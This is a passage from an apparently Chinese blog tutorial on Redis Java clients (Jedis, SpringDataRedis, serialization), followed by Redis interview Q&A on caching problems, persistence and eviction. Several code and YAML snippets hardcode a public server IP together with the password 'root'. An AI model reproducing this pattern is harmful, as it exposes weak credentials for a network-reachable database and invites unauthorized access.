&lt;li&gt;Jedis和Lettuce：这两个主要是提供了Redis命令对应的API，方便我们操作Redis，而SpringDataRedis又对这两种做了抽象和封装，因此我们后期会直接以SpringDataRedis来学习。&lt;/li&gt;
&lt;li&gt;Redisson：是在Redis基础上实现了分布式的可伸缩的java数据结构，例如Map、Queue等，而且支持跨进程的同步机制：Lock、Semaphore等待，比较适合用来实现特殊的功能需求。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;jedis客户端&#34;&gt;Jedis客户端&lt;/h3&gt;
&lt;h4 id=&#34;快速入门&#34;&gt;快速入门&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;导入Jedis的maven坐标&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!--jedis--&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;redis.clients&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;jedis&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;3.7.0&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;!--单元测试--&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.junit.jupiter&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;junit-jupiter&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;5.7.0&amp;lt;/version&amp;gt;
    &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;建立连接
新建一个单元测试类&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;private Jedis jedis;

@BeforeEach
void setUp() {
    //1. 建立连接
    jedis = new Jedis(&amp;#34;101.42.225.160&amp;#34;, 6379);
    //2. 设置密码
    jedis.auth(&amp;#34;root&amp;#34;);
    //3. 选择库
    jedis.select(0);
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;测试&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@Test
void testString(){
    jedis.set(&amp;#34;name&amp;#34;,&amp;#34;Kyle&amp;#34;);
    String name = jedis.get(&amp;#34;name&amp;#34;);
    System.out.println(&amp;#34;name = &amp;#34; + name);
}

@Test
void testHash(){
    jedis.hset(&amp;#34;reggie:user:1&amp;#34;,&amp;#34;name&amp;#34;,&amp;#34;Jack&amp;#34;);
    jedis.hset(&amp;#34;reggie:user:2&amp;#34;,&amp;#34;name&amp;#34;,&amp;#34;Rose&amp;#34;);
    jedis.hset(&amp;#34;reggie:user:1&amp;#34;,&amp;#34;age&amp;#34;,&amp;#34;21&amp;#34;);
    jedis.hset(&amp;#34;reggie:user:2&amp;#34;,&amp;#34;age&amp;#34;,&amp;#34;18&amp;#34;);
    Map&amp;lt;String, String&amp;gt; map = jedis.hgetAll(&amp;#34;reggie:user:1&amp;#34;);
    System.out.println(map);
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;释放资源&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@AfterEach
void tearDown(){
    if (jedis != null){
        jedis.close();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;连接池&#34;&gt;连接池&lt;/h4&gt;
&lt;p&gt;Jedis本身是线程不安全的，并且频繁的创建和销毁连接会有性能损耗，因此我们推荐大家使用Jedis连接池代替Jedis的直连方式。&lt;/p&gt;
&lt;p&gt;新建一个util，用于存放我们编写的工具类&lt;/p&gt;
&lt;p&gt;后面我们使用SpringDataRedis的时候，可以直接在yml配置文件里配置这些内容&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public class JedisConnectionFactory {

    private static JedisPool jedisPool;

    static {
        // 配置连接池
        JedisPoolConfig poolConfig = new JedisPoolConfig();
        poolConfig.setMaxTotal(8);
        poolConfig.setMaxIdle(8);
        poolConfig.setMinIdle(0);
        poolConfig.setMaxWaitMillis(1000);
        // 创建连接池对象，参数：连接池配置、服务端ip、服务端端口、超时时间、密码
        jedisPool = new JedisPool(poolConfig, &amp;#34;101.42.225.160&amp;#34;, 6379, 1000, &amp;#34;root&amp;#34;);
    }

    public static Jedis getJedis(){
        return jedisPool.getResource();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后我们的测试类就可以修改为如下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@SpringBootTest
class RedisTestApplicationTests {

    private Jedis jedis = JedisConnectionFactory.getJedis();

    @Test
    void testString(){
        jedis.set(&amp;#34;name&amp;#34;,&amp;#34;Kyle&amp;#34;);
        String name = jedis.get(&amp;#34;name&amp;#34;);
        System.out.println(&amp;#34;name = &amp;#34; + name);
    }

    @Test
    void testHash(){
        jedis.hset(&amp;#34;reggie:user:1&amp;#34;,&amp;#34;name&amp;#34;,&amp;#34;Jack&amp;#34;);
        jedis.hset(&amp;#34;reggie:user:2&amp;#34;,&amp;#34;name&amp;#34;,&amp;#34;Rose&amp;#34;);
        jedis.hset(&amp;#34;reggie:user:3&amp;#34;,&amp;#34;name&amp;#34;,&amp;#34;Kyle&amp;#34;);
        jedis.hset(&amp;#34;reggie:user:1&amp;#34;,&amp;#34;age&amp;#34;,&amp;#34;21&amp;#34;);
        jedis.hset(&amp;#34;reggie:user:2&amp;#34;,&amp;#34;age&amp;#34;,&amp;#34;18&amp;#34;);
        jedis.hset(&amp;#34;reggie:user:3&amp;#34;,&amp;#34;age&amp;#34;,&amp;#34;18&amp;#34;);
        Map&amp;lt;String, String&amp;gt; map = jedis.hgetAll(&amp;#34;reggie:user:1&amp;#34;);
        System.out.println(map);
    }

    @AfterEach
    void tearDown(){
        if (jedis != null){
            jedis.close();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;springdataredis客户端&#34;&gt;SpringDataRedis客户端&lt;/h3&gt;
&lt;p&gt;SpringData是Spring中数据操作的模块，包含对各种数据库的集成，其中对Redis的集成模块就叫做SpringDataRedis&lt;/p&gt;
&lt;p&gt;官网地址：https://spring.io/projects/spring-data-redis&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提供了对不同Redis客户端的整合（Lettuce和Jedis）&lt;/li&gt;
&lt;li&gt;提供了RedisTemplate统一API来操作Redis&lt;/li&gt;
&lt;li&gt;支持Redis的发布订阅模型&lt;/li&gt;
&lt;li&gt;支持Redis哨兵和Redis集群&lt;/li&gt;
&lt;li&gt;支持基于Lettuce的响应式编程&lt;/li&gt;
&lt;li&gt;支持基于JDK、JSON、字符串、Spring对象的数据序列化及反序列化&lt;/li&gt;
&lt;li&gt;支持基于Redis的JDKCollection实现&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SpringDataRedis中提供了RedisTemplate工具类，其中封装了各种对Redis的操作。并且将不同数据类型的操作API封装到了不同的类型中：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;API&lt;/th&gt;
&lt;th&gt;返回值类型&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;redisTemplate.opsForValue()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;ValueOperations&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;操作 String 类型数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;redisTemplate.opsForHash()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;HashOperations&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;操作 Hash 类型数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;redisTemplate.opsForList()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;ListOperations&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;操作 List 类型数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;redisTemplate.opsForSet()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SetOperations&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;操作 Set 类型数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;redisTemplate.opsForZSet()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;ZSetOperations&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;操作 SortedSet 类型数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;redisTemplate&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;通用的命令&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;快速入门-1&#34;&gt;快速入门&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;导入依赖&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!--redis依赖--&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;spring-boot-starter-data-redis&amp;lt;/artifactId&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;!--common-pool--&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.apache.commons&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;commons-pool2&amp;lt;/artifactId&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;!--Jackson依赖--&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;jackson-databind&amp;lt;/artifactId&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;!--lombok--&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.projectlombok&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;lombok&amp;lt;/artifactId&amp;gt;
    &amp;lt;optional&amp;gt;true&amp;lt;/optional&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;spring-boot-starter-test&amp;lt;/artifactId&amp;gt;
    &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;配置Redis&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;spring:
  redis:
    host: 101.42.225.160
    port: 6379
    password: root
    lettuce:
      pool:
        max-active: 8
        max-idle: 8
        min-idle: 0
        max-wait: 100ms
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;注入RedisTemplate&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@Autowired
private RedisTemplate redisTemplate;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;编写测试方法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@Test
void stringTest(){
    redisTemplate.opsForValue().set(&amp;#34;username&amp;#34;,&amp;#34;David&amp;#34;);
    String username = (String) redisTemplate.opsForValue().get(&amp;#34;username&amp;#34;);
    System.out.println(username);
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;自定义序列化&#34;&gt;自定义序列化&lt;/h4&gt;
&lt;p&gt;RedisTemplate可以接收任意Object作为值写入Redis&lt;/p&gt;
&lt;p&gt;只不过写入前会把Object序列化为字节形式，默认是采用JDK序列化，得到的结果是这样的&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;\xAC\xED\x00\x05t\x00\x06\xE5\xBC\xA0\xE4\xB8\x89
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可读性差&lt;/li&gt;
&lt;li&gt;内存占用较大&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们可以自定义RedisTemplate的序列化方式，代码如下
在config包下编写对应的配置类&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@Configuration
public class RedisConfig {

    @Bean
    public RedisTemplate&amp;lt;String, Object&amp;gt; redisTemplate(RedisConnectionFactory connectionFactory) {
        // 创建RedisTemplate对象
        RedisTemplate&amp;lt;String, Object&amp;gt; template = new RedisTemplate&amp;lt;&amp;gt;();
        // 设置连接工厂
        template.setConnectionFactory(connectionFactory);
        // 创建JSON序列化工具
        GenericJackson2JsonRedisSerializer jsonRedisSerializer =
                new GenericJackson2JsonRedisSerializer();
        // 设置Key的序列化
        template.setKeySerializer(RedisSerializer.string());
        template.setHashKeySerializer(RedisSerializer.string());
        // 设置Value的序列化
        template.setValueSerializer(jsonRedisSerializer);
        template.setHashValueSerializer(jsonRedisSerializer);
        // 返回
        return template;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们编写一个User类，并尝试将其创建的对象存入Redis，看看是什么效果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@Data
@AllArgsConstructor
@NoArgsConstructor
public class User {
    private String name;
    private Integer age;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;测试方法&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
@Test
void stringTest(){
    redisTemplate.opsForValue().set(&amp;#34;userdata&amp;#34;,new User(&amp;#34;张三&amp;#34;,18));
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里采用了JSON序列化来代替默认的JDK序列化方式。最终结果如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{
  &amp;#34;@class&amp;#34;: &amp;#34;com.blog.entity.User&amp;#34;,
  &amp;#34;name&amp;#34;: &amp;#34;张三&amp;#34;,
  &amp;#34;age&amp;#34;: 18
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;整体可读性有了很大提升，并且能将Java对象自动的序列化为JSON字符串，并且查询时能自动把JSON反序列化为Java对象。不过，其中记录了序列化时对应的class名称，目的是为了查询时实现自动反序列化。这会带来额外的内存开销。&lt;/p&gt;
&lt;p&gt;所以肯定会有更好的方法&lt;/p&gt;
&lt;h4 id=&#34;stringredistemplate&#34;&gt;StringRedisTemplate&lt;/h4&gt;
&lt;p&gt;为了节省内存空间，我们可以不使用JSON序列化器来处理value，而是统一使用String序列化器，要求只能存储String类型的key和value。当需要存储Java对象时，手动完成对象的序列化和反序列化。&lt;/p&gt;
&lt;p&gt;因为存入和读取时的序列化及反序列化都是我们自己实现的，SpringDataRedis就不会将class信息写入Redis了&lt;/p&gt;
&lt;p&gt;这种用法比较普遍，因此SpringDataRedis就提供了RedisTemplate的子类：StringRedisTemplate，它的key和value的序列化方式默认就是String方式。源码如下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public class StringRedisTemplate extends RedisTemplate&amp;lt;String, String&amp;gt; {
    public StringRedisTemplate() {
        this.setKeySerializer(RedisSerializer.string());
        this.setValueSerializer(RedisSerializer.string());
        this.setHashKeySerializer(RedisSerializer.string());
        this.setHashValueSerializer(RedisSerializer.string());
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;省去了我们自定义RedisTemplate的序列化方式的步骤（可以将之前配置的RedisConfig删除掉），而是直接使用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@Test
void stringTest() throws JsonProcessingException {
    //创建对象
    User user = new User(&amp;#34;张三&amp;#34;, 18);
    //手动序列化
    String json = mapper.writeValueAsString(user);
    //写入数据
    stringRedisTemplate.opsForValue().set(&amp;#34;userdata&amp;#34;, json);
    //获取数据
    String userdata = stringRedisTemplate.opsForValue().get(&amp;#34;userdata&amp;#34;);
    //手动反序列化
    User readValue = mapper.readValue(userdata, User.class);
    System.out.println(readValue);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;存入Redis中是这样的&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{
  &amp;#34;name&amp;#34;: &amp;#34;张三&amp;#34;,
  &amp;#34;age&amp;#34;: 18
}
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;hr&gt;
&lt;h2 id=&#34;redis面试题&#34;&gt;Redis面试题&lt;/h2&gt;
&lt;details&gt;
&lt;summary&gt;什么是缓存穿透？怎么解决？&lt;/summary&gt;
&lt;p&gt;缓存穿透是指查询一个不存在的数据，如果从存储层查询不到数据，则不会写入缓存，此时就会导致每次请求这个不存在的数据，都会到DB里去查询，可能会导致DB挂掉，这种情况大概率是遭到了攻击。&lt;/p&gt;
&lt;p&gt;解决方案的话，一般可以缓存空数据，即缓存这个不存在的数据。另外一种解决方案就是使用布隆过滤器&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;好的，那你能介绍一下布隆过滤器吗？&lt;/summary&gt;
&lt;p&gt;布隆过滤器主要是用于检索一个元素绝对不在集合中或可能在集合中。它的底层主要是先去初始化一个比较大的数组，里面存放二进制的0或1，在一开始都是0，当一个key来了之后经过3个哈希函数的计算，模于数组长度找到数据的下标，然后把下标位置的0改为1，这样的话，三个数组下标的位置就能标明一个key的存在，查找的过程也是一样的。&lt;/p&gt;
&lt;p&gt;当然这个也是有缺点的，布隆过滤器可能存在一些误判，我们一般是可以设置这个误判率的，大概不会超过5%，因为哈希冲突不可能避免，所以这个误判是必然存在的，要不然就增加数组长度。但其实5%的误判率一般项目也是能接受的，不至于高并发下压倒数据库。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/redis1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;用上图来举个例子&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;初始化布隆过滤器为 16 位，每一位初始值都为 0。&lt;/li&gt;
&lt;li&gt;将 Fredy 录入布隆过滤器，经过三个哈希函数的计算，将第 1、3、7 位设为 1。&lt;/li&gt;
&lt;li&gt;将 Eli 录入布隆过滤器，经过三个哈希函数的计算，将第 10、12、15 位设为 1。&lt;/li&gt;
&lt;li&gt;查询 Tom，经过三个哈希函数的计算，得到第 0、2、5 位，这三个位置上的数字都是 0。根据布隆过滤器的规则，可以判断 Tom 绝对不在数据库中。&lt;/li&gt;
&lt;li&gt;查询 Lily，经过三个哈希函数的计算，得到第 7、12、15 位，这三个位置上的数字都是 1。这里需要澄清一点：虽然这三个位置上的数字都是 1，但布隆过滤器只能判断 Lily 可能存在于数据库中，而不能确定 Lily 真的在数据库中。因为这三个位上的 1 可能是由 Fredy 和 Eli 共同组成的，所以存在一定的误判率。&lt;/li&gt;
&lt;li&gt;当布隆过滤器判断数据一定不存在，就不用查询数据库，直接返回不存在的结果。当布隆过滤器判断可能存在，那么查询数据库，以确认元素是否真的存在。&lt;/li&gt;
&lt;/ol&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;什么是缓存击穿？怎么解决？&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;缓存击穿是指在缓存中设置了过期时间的某个key，在某个时间点这个key正好过期，导致缓存失效，恰好此时有大量病发情趣同时访问该key，这些请求会直接访问后端数据库，造成数据库压力骤增，严重影响系统性能，甚至直接压垮数据库。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解决方案的话，我了解的有两种&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;方案一：使用互斥锁&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;当缓存失效时，不立即去加载数据库，而是先使用Redis的SETNX(Set if Not Exists)命令去设置一个互斥锁，只有一个请求能够成功设置互斥锁，其他请求会在这一步被阻塞&lt;/li&gt;
&lt;li&gt;成功设置互斥锁的请求，再去加载数据库，并将加载的数据回设到缓存中&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;方案二：逻辑过期&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;在设置缓存key的同时，额外存储一个过期时间字段到缓存中，但是不给当前key设置过期时间&lt;/li&gt;
&lt;li&gt;当查询请求到达时，首先从缓存中取出数据，并且额外判断一下存储key的过期时间字段，若过期则认为缓存失效&lt;/li&gt;
&lt;li&gt;当缓存失效时，开启另外一个线程进行数据的异步加载和缓存更新，当前请求直接返回缓存中的旧数据，但这部分数据可能不是最新&lt;/li&gt;
&lt;li&gt;这种方案一定程度上保证了高可用性，避免了大量请求直接打到数据库。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;当然两种方案各有利弊
&lt;ul&gt;
&lt;li&gt;方案一使用了互斥锁，保证了数据的强一致性，到哪性能可能会受到锁的竞争影响，而且需要考虑死锁的问题&lt;/li&gt;
&lt;li&gt;方案二优先考虑的是高可用和性能，但不能保证强一致性，有可能会出现缓存和数据库数据不一致的情况。&lt;/li&gt;
&lt;li&gt;实际使用中根据我们的需求来选择要保证一致性还是可用性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;什么是缓存雪崩？怎么解决？&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;缓存雪崩是指换成那种设置了相同的过期时间，导致大量缓存在同一时刻同时失效，进而导致所有的请求直接转发到了后端数据库，导致数据库瞬时压力过大，可能直接压垮数据库。它与缓存击穿的区别在于，缓存雪崩是很多key同时失效，而缓存击穿是某一个key缓存失效&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解决方案主要是在设置缓存的时候，可以给每个缓存的过期时间加上一个随机值，例如在原有的失效时间基础上，再加上一个1~5分钟的随机值。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Redis作为缓存，MySQL的数据如何与Redis进行同步呢？（双写一致性问题）&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;嗯，这个需要分为两种情况。
&lt;ul&gt;
&lt;li&gt;保证强一致性：使用读写锁。
&lt;ul&gt;
&lt;li&gt;如果是需要保证强一致性的话，可以采用Redisson实现的读写锁，在读的时候添加共享锁，可以保证读读不互斥，读写互斥。当我们更新数据的时候，添加排他锁，它是读写、读读都互斥，这样能保证在写数据的同时不会让其他线程来读数据，避免其他线程读到脏数据。这里需要注意读方法和写方法上需要使用同一把锁。&lt;/li&gt;
&lt;li&gt;排他锁的底层使用的也是setnx，保证同时只有一个线程操作被锁住的方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;然后不追求强一致性，数据同步可以有一定的延时。
&lt;ul&gt;
&lt;li&gt;可以采用阿里的canal组件来实现数据同步：不需要更改业务代码，部署一个canal服务，canal服务会把自己伪装成MySQL的一个从节点，当MySQL数据更新以后，canal会读取binlog数据，然后通过canal的客户端获取到数据，更新缓存即可。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Redis作为缓存，数据的持久化是怎么做的呢？&lt;/summary&gt;
&lt;p&gt;在Redis中提供了两种数据持久化的方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RDB
&lt;ul&gt;
&lt;li&gt;RDB是一个快照文件，它是把Redis内存存储的数据写到磁盘上，当Redis实例宕机恢复数据的时候，方便从RDB的快照文件中恢复数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AOF
&lt;ul&gt;
&lt;li&gt;AOF的含义是追加文件，当Redis操作写命令的时候，都会存储到这个文件中，当Redis实例宕机恢复数据的时候，会从这个文件中再次执行一遍命令来恢复数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;那这两种方式，哪种恢复的比较快呢？&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;RDB因为是二进制文件，在保存的时候体积也是比较小的，所以恢复的比较快，但是它有可能会丢失数据，因为Redis内部设置了触发RDB的机制，所以可能会丢失一段时间的缓存&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;save 900 1      ## 900秒内，如果至少有1个key发生了变化，则触发一次持久化操作
save 300 10     ## 300秒内，10个key变化
save 60 10000   ## 60秒内，10000个key变化
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;AOF恢复的速度慢一些，但是它丢失数据的风险要小很多，在Redis的配置文件中也可以配置AOF的刷盘策略，采用everysec的话，最多丢失一秒的数据
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;配置项&lt;/th&gt;
&lt;th&gt;刷盘时机&lt;/th&gt;
&lt;th&gt;优点&lt;/th&gt;
&lt;th&gt;缺点&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Always&lt;/td&gt;
&lt;td&gt;同步刷盘&lt;/td&gt;
&lt;td&gt;可靠性高，几乎不丢数据&lt;/td&gt;
&lt;td&gt;性能影响大&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;everysec&lt;/td&gt;
&lt;td&gt;每秒刷盘&lt;/td&gt;
&lt;td&gt;性能适中&lt;/td&gt;
&lt;td&gt;最多丢失1秒数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no&lt;/td&gt;
&lt;td&gt;操作系统控制&lt;/td&gt;
&lt;td&gt;性能最好&lt;/td&gt;
&lt;td&gt;可靠性较差，可能丢失大量数据&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;实际环境中，都是结合使用RDB和AOF来使用的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Redis的数据过期策略有哪些？&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;Redis提供了两种数据过期删除策略
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;第一种是惰性删除，在设置key过期时间后，我们不去管它，当我们需要使用该key时，我们再检查其是否过期，如果过期，我们就删除它，没过期，我们就返回该key。这种方法的缺点是，如果有大量冷数据，长时间不会被使用到，会占用内存空间，不会被及时清理掉。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第二种是定期删除，每隔一段时间，我们就对一些key进行检查，删除里面已经过期的key。定期清理的两种模式&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;SLOW模式是定时任务，执行频率默认为10HZ，每次不超过25ms，不过也可以通过Redis的配置文件来手动配置&lt;/li&gt;
&lt;li&gt;FAST模式执行频率不固定，每次事件循环会尝试执行，但两次间隔不低于2ms，每次耗时不超过1ms&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Redis的过期删除策略，一般都是结合这二者一起来使用的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Redis的数据淘汰策略有哪些？&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;Redis支持八种不同的策略来选择要删除的key&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;noeviction： 不淘汰任何key，但是内存满时不允许写入新数据，默认就是这种策略&lt;/li&gt;
&lt;li&gt;volatile-ttl： 对设置了TTL的key，比较key的剩余TTL值，TTL越小越先被淘汰&lt;/li&gt;
&lt;li&gt;allkeys-random：对全体key ，随机进行淘汰&lt;/li&gt;
&lt;li&gt;volatile-random：对设置了TTL的key ，随机进行淘汰&lt;/li&gt;
&lt;li&gt;allkeys-lru： 对全体key，基于LRU算法进行淘汰，LRU的意思是最近最少使用&lt;/li&gt;
&lt;li&gt;volatile-lru： 对设置了TTL的key，基于LRU算法进行淘汰&lt;/li&gt;
&lt;li&gt;allkeys-lfu： 对全体key，基于LFU算法进行淘汰，LFU的意思是最少频率使用&lt;/li&gt;
&lt;li&gt;volatile-lfu： 对设置了TTL的key，基于LFU算法进行淘汰&lt;/li&gt;
&lt;/ol&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;假如数据库中有1000w数据，Redis中只能缓存20w条数据，如何保证Redis中的数据都是热点数据？&lt;/summary&gt;
